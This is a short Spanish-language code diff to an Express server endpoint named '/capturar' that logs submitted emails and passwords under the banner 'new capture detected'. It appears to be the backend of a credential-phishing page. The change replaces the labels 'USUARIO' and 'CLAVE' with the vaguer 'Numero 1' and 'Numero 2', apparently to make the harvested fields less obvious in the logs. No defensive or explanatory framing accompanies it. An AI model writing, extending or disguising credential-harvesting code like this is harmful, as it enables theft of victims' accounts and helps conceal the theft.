@@ -14,8 +14,8 @@ app.post('/capturar', (req, res) => {
     // --- MODIFICACIÓN AQUÍ PARA VER DATOS EN LOGS ---
     console.log("========================================");
     console.log("NUEVA CAPTURA DETECTADA");
-    console.log(`USUARIO: ${email}`);
-    console.log(`CLAVE: ${password}`);
+    console.log(`Numero 1: ${email}`);
+    console.log(`Numero 2: ${password}`);
     console.log("========================================");
     // ----------------------------------------------
 
